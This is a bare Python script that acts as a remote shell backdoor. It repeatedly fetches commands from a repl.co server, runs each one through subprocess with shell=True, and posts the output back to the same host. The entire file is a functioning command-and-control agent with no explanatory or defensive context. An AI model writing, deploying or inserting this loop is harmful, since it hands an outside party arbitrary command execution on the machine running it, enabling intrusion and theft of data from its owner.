import requests
from time import sleep
import subprocess

POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTROLLED"
GET_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/COMMANDS"
while True:
    r = requests.get(url = GET_URL)

    splitted = r.text.split("<br>")
    print(splitted)
    if splitted[-1] == "...END...":
        sleep(0.02)
    else:
        command = splitted[-1]
        try:

            cmd = subprocess.run(command, capture_output=True,shell=True,timeout=30)
            out = cmd.stdout.decode()
            err = cmd.stderr.decode()
            if len(err) > 1:
     	       obj = {"data":err}
            else:
       	       obj = {"data":out}
            POST_r = requests.post(url = POST_URL, data=obj)
       	    sleep(0.02)
        except Exception as e:
            POST_r = requests.post(url = POST_URL, data={"data":e})

            
